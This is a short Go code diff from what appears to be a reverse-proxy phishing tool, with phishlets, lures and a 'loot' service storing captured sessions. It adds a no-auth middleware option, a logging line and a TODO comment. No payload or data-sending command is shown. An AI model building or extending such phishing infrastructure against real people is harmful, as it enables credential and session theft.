@@ -87,6 +87,7 @@ func setupProxyHandler(conf *appConfig, conv DomainConverter,
 
 func setupAuthHandler(conf *appConfig, conv DomainConverter, lureService LureService,
 	lootService *lootService) fiber.Handler {
+
 	cookieManager := NewCookieManager()
 	storage := NewSessionStorage(memory.New(), cookieManager, lootService)
 	store := session.New(session.Config{
@@ -97,7 +98,7 @@ func setupAuthHandler(conf *appConfig, conv DomainConverter, lureService LureSer
 		CookieHTTPOnly: true,
 		Storage:        storage,
 	})
-	return NewAuthMiddleware(AuthConfig{
+	authConf := AuthConfig{
 		CookieName:     conf.SessionCookieName,
 		CookieManager:  cookieManager,
 		Store:          store,
@@ -105,7 +106,11 @@ func setupAuthHandler(conf *appConfig, conv DomainConverter, lureService LureSer
 		LoginURL:       conv.ToProxyURL(conf.Phishlet.LoginURL),
 		LureService:    lureService,
 		AuthService:    lootService,
-	})
+	}
+	if conf.NoAuth {
+		return NewNoAuthMiddleware(authConf)
+	}
+	return NewAuthMiddleware(authConf)
 }
 
 func setupApp(limit, api, auth, proxy fiber.Handler) *appServer {
@@ -150,6 +155,7 @@ func (hostFS) Open(name string) (fs.File, error) {
 
 var osFS hostFS
 
+// TODO refactor logging
 func main() {
 	var configFile, envFile string
 	flag.StringVar(&configFile, "c", "", "yaml config file")
@@ -217,6 +223,7 @@ type appServer struct {
 }
 
 func (s *appServer) Listen(conf *appConfig) error {
+	log.Printf("listening on %s", conf.ListenAddr)
 	if conf.TLSKey != "" {
 		return s.app.ListenTLS(conf.ListenAddr, conf.TLSCert, conf.TLSKey)
 	}
